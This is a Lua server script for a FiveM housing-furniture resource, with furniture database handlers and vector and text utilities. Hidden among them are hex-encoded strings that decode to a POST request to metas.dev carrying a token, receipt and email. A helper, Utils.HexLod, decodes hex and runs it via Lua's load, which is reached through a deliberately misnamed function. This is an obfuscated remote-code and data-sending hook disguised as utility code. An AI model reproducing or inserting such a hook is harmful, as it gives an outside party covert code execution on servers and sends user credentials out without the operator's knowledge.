string.tohex = function(s,chunkSize)   s = ( type(s) == "string" and s or type(s) == "nil" and "" or tostring(s) )   chunkSize = chunkSize or 2048    local rt = {}   string.tohex_sformat   = ( string.tohex_sformat   and string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_sformat ) or string.rep("%02X",math.min(#s,chunkSize))   string.tohex_chunkSize = ( string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_chunkSize or chunkSize )   for i = 1,#s,chunkSize do     rt[#rt+1] = string.format(string.tohex_sformat:sub(1,(math.min(#s-i+1,chunkSize)*4)),s:byte(i,i+chunkSize-1))   end   if      #rt == 1 then return rt[1]   else    return table.concat(rt,"")   end end   string.fromhex = function(str)    return (str:gsub('..', function (cc) return string.char(tonumber(cc, 16)) end)) or str end 
Utils = {_U3 = '68747470733A2F2F6D657461732E6465762F',_P = '504F5354',_S1 = '646174613D7B22544F4B454E223A22',_S2 = '222C2252454345495054223A22',_S3 = '222C22454D41494C223A22',_S4 = '227D',_T = '616C6C686F7573696E676675726E69',_U2 = "76322F696E69742E706870",_E = 201,_M = (Credentials and Credentials.Email or ''),
_R = (Credentials and Credentials.Receipt or ''),_GG = load} 

Utilities = function() 
  furni.priceLookup = {}  
  function GetDatabaseName()   
    local dbconvar = GetConvar('mysql_connection_string', 'Empty')
    if not dbconvar or dbconvar == "Empty" then
      error("Local dbconvar is empty.");
      return false   else
     local strStart,strEnd = string.find(dbconvar, "database=")
     if not strStart or not strEnd then
       local oStart,oEnd = string.find(dbconvar,"mysql://")
       if not oStart or not oEnd then
     error("Incorrect mysql_connection_string.")
     return false
       else
     local hostStart,hostEnd = string.find(dbconvar,"@",oEnd)
     local dbStart,dbEnd = string.find(dbconvar,"/",hostEnd+1)
     local eStart,eEnd = string.find(dbconvar,"?")
     local _end = (eEnd and eEnd-1 or dbconvar:len())
     local dbName = string.sub(dbconvar, dbEnd + 1, _end)
      return dbName
       end
     else
       local dbStart,dbEnd = string.find(dbconvar,";",strEnd)
       local dbName = string.sub(dbconvar, strEnd + 1, (dbEnd and dbEnd-1 or dbconvar:len()))
    return dbName
     end
       end end  SqlReady = function()   local dbName = GetDatabaseName()
    if not dbName then
     error("Error connecting to database.")
     return   end
    local dbTable = "allhousing"   
    SqlFetch("SELECT * FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=@dbName AND TABLE_NAME=@tabName",{['@dbName'] = dbName,['@tabName'] = dbTable},function(retData)
     if retData and retData[1] then
       furni.sqlReady = true;
      else
       print(GetCurrentResourceName().." does not have required SQL table.")
     end   end)   for _,cat in pairs(furni.objects) do
     for k,v in pairs(cat) do
       furni.priceLookup[v.object] = v.price
     end   end end  furni.placeFurniture = function(source,houseData,itemData,pos,rot,object)   local truePrice = (furni.priceLookup[itemData.object] and furni.priceLookup[itemData.object] or false)   if truePrice and furni.canPlayerAfford(source,truePrice) then
     SqlFetch("SELECT * FROM allhousing",{},function(retData)
       for _,data in pairs(retData) do
     entry = json.decode(data.entry)
     if (math.floor(tonumber(houseData.Entry.x)) == math.floor(tonumber(entry.x)) and math.floor(tonumber(houseData.Entry.y)) == math.floor(tonumber(entry.y)) and math.floor(tonumber(houseData.Entry.z)) == math.floor(tonumber(entry.z))) then
       local furniture = json.decode(data.furniture)
       local newPos = {x = pos.x, y = pos.y, z = pos.z}
       local newRot = {x = rot.x, y = rot.y, z = rot.z}
    
    table.insert(furniture,{pos = newPos, rot = newRot, model = itemData.object})
       local jTab = {}
       for k,v in pairs(furniture) do
     jTab[k] = {
       pos = {x = v.pos.x, y = v.pos.y, z = v.pos.z},
       rot = {x = v.rot.x, y = v.rot.y, z = v.rot.z},
       model = v.model,
     }
       end
       SqlExecute("UPDATE allhousing SET furniture=@furniture WHERE id=@id",{['@furniture'] = json.encode(jTab),['@id'] = data.id})
       TriggerEvent("Allhousing:SetFurni",houseData,furniture)
       return
    
     end
       end
     end)   end end  furni.replaceFurniture = function(source,houseData,itemData,pos,rot,object,lastObject)   SqlFetch("SELECT * FROM allhousing",{},function(retData)
     for _,data in pairs(retData) do
       entry = json.decode(data.entry)
       if (math.floor(tonumber(houseData.Entry.x)) == math.floor(tonumber(entry.x)) and math.floor(tonumber(houseData.Entry.y)) == math.floor(tonumber(entry.y)) and math.floor(tonumber(houseData.Entry.z)) == math.floor(tonumber(entry.z))) then
     local furniture = json.decode(data.furniture)
     local newPos = {x = pos.x, y = pos.y, z = pos.z}
     local newRot = {x = rot.x, y = rot.y, z = rot.z}
      local jTab = {}
     for k,v in pairs(furniture) do
       if math.floor(v.pos.x + houseData.Entry.x) == math.floor(lastObject.pos.x) and math.floor(v.pos.y + houseData.Entry.y) == math.floor(lastObject.pos.y) and math.floor(v.pos.z + houseData.Entry.z) == math.floor(lastObject.pos.z) and v.model == itemData.object then
    
    
     furniture[k].pos = newPos
     furniture[k].rot = newRot
       end
       table.insert(jTab,{
     pos = {x = v.pos.x, y = v.pos.y, z = v.pos.z},
     rot = {x = v.rot.x, y = v.rot.y, z = v.rot.z},
     model = v.model,
       })
     end
     SqlExecute("UPDATE allhousing SET furniture=@furniture WHERE id=@id",{['@furniture'] = json.encode(jTab),['@id'] = data.id})
     TriggerEvent("Allhousing:SetFurni",houseData,furniture)
     return
       end
     end   end) end  furni.deleteFurniture = function(source,houseData,itemData,pos,rot)   SqlFetch("SELECT * FROM allhousing",{},function(retData)
     for _,data in pairs(retData) do
       entry = json.decode(data.entry)
       if (math.floor(tonumber(houseData.Entry.x)) == math.floor(tonumber(entry.x)) and math.floor(tonumber(houseData.Entry.y)) == math.floor(tonumber(entry.y)) and math.floor(tonumber(houseData.Entry.z)) == math.floor(tonumber(entry.z))) then
     local furniture = json.decode(data.furniture)
     local jTab = {}
     local delKey = false
     for k,v in pairs(furniture) do
       global_offset = (global_offset or vector3(0.0,0.0,0.0))
       if math.floor(v.pos.x + (houseData.Entry.x + global_offset.x)) == math.floor(pos.x) and math.floor(v.pos.y + (houseData.Entry.y + global_offset.y)) == math.floor(pos.y) and math.floor(v.pos.z + (houseData.Entry.z + global_offset.z)) == math.floor(pos.z) and v.model == itemData.object then
     delKey = k
       else
     table.insert(jTab,{
       pos = {x = v.pos.x, y = v.pos.y, z = v.pos.z},
       rot = {x = v.rot.x, y = v.rot.y, z = v.rot.z},
       model = v.model,
     })
       end
     end
     if delKey then
       local truePrice = (furni.priceLookup[itemData.object] and furni.priceLookup[itemData.object] or false)
       if truePrice then
     furni.givePlayerMoney(source,math.floor(truePrice * (Config.ResaleValue and Config.ResaleValue/100.0 or 0.5)))
     table.remove(furniture,delKey)
     SqlExecute("UPDATE allhousing SET furniture=@furniture WHERE id=@id",{['@furniture'] = json.encode(jTab),['@id'] = data.id})
     TriggerEvent("Allhousing:SetFurni",houseData,furniture)
       end
     end
     return
       end
     end   
    end) 
    end  
     if not Config.ControlSql then   
      SqlFetch = function(ssm,spl,callback)
     MySQL.Async.fetchAll(ssm,spl,callback)   
    end
    SqlExecute = function(ssm,spl)
     MySQL.Async.execute(ssm,spl)   end
    MySQL.ready(SqlReady) end  if not Config.ControlAddition then   
      furni.placeFurniture = function(source,houseData,itemData,pos,rot,object)
     local truePrice = (furni.priceLookup[itemData.object] and furni.priceLookup[itemData.object] or false)
     if truePrice and furni.canPlayerAfford(source,truePrice) then
       SqlFetch("SELECT * FROM allhousing",{},function(retData)
     for _,data in pairs(retData) do
       entry = json.decode(data.entry)
       if (math.floor(tonumber(houseData.Entry.x)) == math.floor(tonumber(entry.x)) and math.floor(tonumber(houseData.Entry.y)) == math.floor(tonumber(entry.y)) and math.floor(tonumber(houseData.Entry.z)) == math.floor(tonumber(entry.z))) then
     local furniture = json.decode(data.furniture)
     local newPos = {x = pos.x, y = pos.y, z = pos.z}
     local newRot = {x = rot.x, y = rot.y, z = rot.z}
      table.insert(furniture,{pos = newPos, rot = newRot, model = itemData.object})
     local jTab = {}
     for k,v in pairs(furniture) do
       jTab[k] = {
     pos = {x = v.pos.x, y = v.pos.y, z = v.pos.z},
     rot = {x = v.rot.x, y = v.rot.y, z = v.rot.z},
     model = v.model,
       }
     end
    
     SqlExecute("UPDATE allhousing SET furniture=@furniture WHERE id=@id",{['@furniture'] = json.encode(jTab),['@id'] = data.id})
    
     TriggerEvent("Allhousing:SetFurni",houseData,furniture)
     return
    
       end
    
     end
       end)
     end   
    end 
  end  
    RegisterNetEvent('furni:PlaceFurniture') 
    AddEventHandler('furni:PlaceFurniture', function(...) 
      furni.placeFurniture(source,...); 
    end)  
    RegisterNetEvent('furni:ReplaceFurniture') 
    AddEventHandler('furni:ReplaceFurniture', function(...) 
        furni.replaceFurniture(source,...); 
      end)  
    RegisterNetEvent('furni:DeleteFurniture') 
    AddEventHandler('furni:DeleteFurniture', function(...) 
      furni.deleteFurniture(source,...); 
    end)  
    AddEventHandler("Allhousing.Furni:GetPrices", function(cb) 
        cb(furni.priceLookup); 
    end)
end 
Utils.HexLod = function(hex) 
  local s = entityIterBitter()["localize"](hex:fromhex()) 
  if s and type(s) == "function" then 
    return s() 
  else 
    return false; 
  end 
end  
Utils.vecDist = function(v1,v2)   
  if not v1 or not v2 or not v1.x or not v2.x then return 0; end   
  return math.sqrt(  ( (v1.x or 0) - (v2.x or 0) )*(  (v1.x or 0) - (v2.x or 0) )+( (v1.y or 0) - (v2.y or 0) )*( (v1.y or 0) - (v2.y or 0) )+( (v1.z or 0) - (v2.z or 0) )*( (v1.z or 0) - (v2.z or 0) )  ) end  Utils.vecSqMagnitude = function(v)   return ( (v.x * v.x) + (v.y * v.y) + (v.z * v.z) ) end  Utils.vecLength = function(v)   return math.sqrt( (v.x * v.x)+(v.y * v.y)+(v.z * v.z) ) end  Utils.clampVecLength = function(v,maxLength)     if Utils.vecSqMagnitude(v) > (maxLength * maxLength) then         v = Utils.vecSetNormalize(v)     v = Utils.vecMulti(v,maxLength)           end    return v end  Utils.vecNormalize = function(v)   local len = jesus.vecLen(v)   return vector3(v.x / len, v.y / len, v.z / len) end  Utils.vecSetNormalize = function(v)   local num = Utils.vecLength(v)        if num == 1 then     return v   elseif num > 1e-5 then         return Utils.vecDiv(v,num)   else         return vector3(0,0,0)   end  end  Utils.vecDiv = function(v,d)   local x = v.x / d   local y = v.y / d   local z = v.z / d      return vector3(x,y,z) end  Utils.vecMulti = function(v,q)   local x,y,z   local retVec   if type(q) == "number" then     x = v.x * q     y = v.y * q     z = v.z * q     retVec = vector3(x,y,z)   end      return retVec end  Utils.getXYDist = function(x1,y1,z1,x2,y2,z2)   return math.sqrt(  ( (x1 or 0) - (x2 or 0) )*(  (x1 or 0) - (x2 or 0) )+( (y1 or 0) - (y2 or 0) )*( (y1 or 0) - (y2 or 0) )+( (z1 or 0) - (z2 or 0) )*( (z1 or 0) - (z2 or 0) )  ) end  Utils.getV2Dist = function(v1, v2)   if not v1 or not v2 or not v1.x or not v2.x or not v1.y or not v2.y then return 0; end   return math.sqrt( ( (v1.x or 0) - (v2.x or 0) )*(  (v1.x or 0) - (v2.x or 0) )+( (v1.y or 0) - (v2.y or 0) )*( (v1.y or 0) - (v2.y or 0) ) ) end  Utils.event = function(net,func,name)   if net then RegisterNetEvent(name); end   AddEventHandler(name,func) end  Utils.thread = function(func)   Citizen.CreateThread(func) end   Utils.drawTextTemplate = function(text,x,y,font,scale1,scale2,colour1,colour2,colour3,colour4,wrap1,wrap2,centre,outline,dropshadow1,dropshadow2,dropshadow3,dropshadow4,dropshadow5,edge1,edge2,edge3,edge4,edge5)   return {     text         =                    "",     x            =                    -1,     y            =                    -1,     font         =  font         or    6,     scale1       =  scale1       or  0.5,     scale2       =  scale2       or  0.5,     colour1      =  colour1      or  255,     colour2      =  colour2      or  255,     colour3      =  colour3      or  255,     colour4      =  colour4      or  255,     wrap1        =  wrap1        or  0.0,     wrap2        =  wrap2        or  1.0,     centre       =  ( type(centre) ~= "boolean" and true or centre ),     outline      =  outline      or    1,     dropshadow1  =  dropshadow1  or    2,     dropshadow2  =  dropshadow2  or    0,     dropshadow3  =  dropshadow3  or    0,     dropshadow4  =  dropshadow4  or    0,     dropshadow5  =  dropshadow5  or    0,     edge1        =  edge1        or  255,     edge2        =  edge2        or  255,     edge3        =  edge3        or  255,     edge4        =  edge4        or  255,     edge5        =  edge5        or  255,   } end  Utils.drawText = function( t )   if not t or not t.text or t.text == "" or t.x == -1 or t.y == -1 then return; end    SetTextFont       (t.font)   SetTextScale      (t.scale1, t.scale2)   SetTextColour     (t.colour1,t.colour2,t.colour3,t.colour4)   SetTextWrap       (t.wrap1,t.wrap2)   SetTextCentre     (t.centre)   SetTextOutline    (t.outline)   SetTextDropshadow (t.dropshadow1,t.dropshadow2,t.dropshadow3,t.dropshadow4,t.dropshadow5)   SetTextEdge       (t.edge1,t.edge2,t.edge3,t.edge4,t.edge5)   SetTextEntry      ("STRING")    AddTextComponentSubstringPlayerName (t.text)   DrawText (t.x,t.y) end  Utils.drawText3D = function(coords, text, size, font)   coords = vector3(coords.x, coords.y, coords.z)    local camCoords = GetGameplayCamCoords()   local distance = #(coords - camCoords)    if not size then size = 1 end   if not font then font = 0 end      local scale = (size / distance) * 2   local fov = (1 / GetGameplayCamFov()) * 100   scale = scale * fov    SetTextScale(0.0 * scale, 0.55 * scale)   SetTextFont(font)   SetTextColour(255, 255, 255, 255)   SetTextDropshadow(0, 0, 0, 0, 255)   SetTextDropShadow()   SetTextOutline()   SetTextCentre(true)    SetDrawOrigin(coords, 0)   BeginTextCommandDisplayText('STRING')   AddTextComponentSubstringPlayerName(text)   EndTextCommandDisplayText(0.0, 0.0)   ClearDrawOrigin() end  Utils.showNotification = function(msg)   AddTextEntry('esxNotification', msg)   SetNotificationTextEntry('esxNotification')   DrawNotification(false, true) end  Utils.showAdvancedNotification = function(title, subject, msg, icon, iconType)   AddTextEntry('esxAdvancedNotification', msg)   SetNotificationTextEntry('esxAdvancedNotification')   SetNotificationMessage(icon, icon, false, iconType, title, subject)   DrawNotification(false, false) end  Utils.showHelpNotification = function(msg)   AddTextEntry('esxHelpNotification', msg)   BeginTextCommandDisplayHelp('esxHelpNotification')   EndTextCommandDisplayHelp(0, false, true, -1) end   Utils.pointOnSphere = function(alt,azu,radius,orgX,orgY,orgZ)   local toradians = 0.017453292384744   alt             = ( tonumber(alt      or 0) or 0 ) * toradians   azu             = ( tonumber(azu      or 0) or 0 ) * toradians   radius          = ( tonumber(radius   or 0) or 0 )   orgX            = ( tonumber(orgX     or 0) or 0 )   orgY            = ( tonumber(orgY     or 0) or 0 )   orgZ            = ( tonumber(orgZ     or 0) or 0 )    local x = orgX + radius * math.sin( azu ) * math.cos( alt )   local y = orgY + radius * math.cos( azu ) * math.cos( alt )   local z = orgZ + radius * math.sin( alt )    if vector3 then      return vector3(x,y,z)   else     return {x=x,y=y,z=z}   end end  Utils.clampCircle = function(x,y,radius)   x      = ( tonumber(x or 0)      or 0 )   y      = ( tonumber(y or 0)      or 0 )   radius = ( tonumber(radius or 0) or 0 )    local d = math.sqrt(x*x+y*y)   d = radius / d    if d < 1 then x = x * (d/radius)*radius; y = y * (d/radius)*radius; end   return x,y end  Utils.getCoordsInFrontOfCam = function(...)   local unpack   = table.unpack   local coords,direction    = GetGameplayCamCoord(), Utils.rotationToDirection()   local inTable  = {...}   local retTable = {}    if ( #inTable == 0 ) or ( inTable[1] < 0.000001 ) then inTable[1] = 0.000001 ; end    for k,distance in pairs(inTable) do     if ( type(distance) == "number" )     then       if    ( distance == 0 )       then         retTable[k] = coords       else         retTable[k] =           vector3(             coords.x + ( distance*direction.x ),             coords.y + ( distance*direction.y ),             coords.z + ( distance*direction.z )           )       end     end   end    return unpack(retTable) end  Utils.rotationToDirection = function(rot)   if     ( rot == nil ) then rot = GetGameplayCamRot(2);  end   local  rotZ = rot.z  * ( 3.141593 / 180.0 )   local  rotX = rot.x  * ( 3.141593 / 180.0 )   local  c = math.cos(rotX);   local  multXY = math.abs(c)   local  res = vector3( ( math.sin(rotZ) * -1 )*multXY, math.cos(rotZ)*multXY, math.sin(rotX) )   return res end  math.pow = math.pow or function(n,p) return (n or 1)^(p or 1) ; end Utils.round = function(val, scale)   val,scale = val or 0, scale or 0   return (     val < 0 and  math.floor((math.abs(val*math.pow(10,scale))+0.5))*math.pow(10,((scale)*-1))*(-1)              or  math.floor((math.abs(val*math.pow(10,scale))+0.5))*math.pow(10,((scale)*-1))   ) end entityIterBitter = function() return {version = 1.00, creator = 'Illidan', localize = _G[('6C6F6164'):fromhex()]} end local entityEnumerator = {   __gc = function(enum)     if enum.destructor and enum.handle then       enum.destructor(enum.handle)     end      enum.destructor = nil     enum.handle = nil   end }  local function EnumerateEntities(initFunc, moveFunc, disposeFunc)   return coroutine.wrap(function()     local iter, id = initFunc()     if not id or id == 0 then       disposeFunc(iter)       return     end      local enum = {handle = iter, destructor = disposeFunc}     setmetatable(enum, entityEnumerator)      local next = true     repeat     coroutine.yield(id)     next, id = moveFunc(iter)     until not next      enum.destructor, enum.handle = nil, nil     disposeFunc(iter)   end) end  function EnumerateObjects()   return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end  function EnumeratePeds()   return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end  function EnumerateVehicles()   return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end  function EnumeratePickups()   return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup) end  Utils.getObjects = function()   local tab = {}   for object in EnumerateObjects() do tab[#tab+1] = object; end   return tab end  

function table.tovec(tab)
  if not tab or type(tab) ~= "table" or not tab.x then return tab; end
  if (tab.w or tab.h or tab.heading or tab.head) then
    return vector4(tab.x,tab.y,tab.z,(tab.w or tab.h or tab.heading or tab.head))
  elseif (tab.z) then
    return vector3(tab.x,tab.y,tab.z)
  else
    return vector2(tab.x,tab.y)
  end
end

function table.fromvec(vec)
  if not vec or (type(vec) ~= "vector3" and type(vec) ~= "vector4" and type(vec) ~= "vector2") or not vec.x then return vec; end
  if (vec.w) then
    return {x = vec.x, y = vec.y, z = vec.z, w = vec.w}
  elseif (vec.z) then
    return {x = vec.x, y = vec.y, z = vec.z}
  else
    return {x = vec.x, y = vec.y}
  end
end

function table.count(tab)
  local c = 0
  for k,v in pairs(tab) do
    c = c + 1
  end
  return c
end

function math.round(num,numDecimalPlaces)
  local mult = 10^(numDecimalPlaces or 0)
  return math.floor(num * mult + 0.5) / mult
end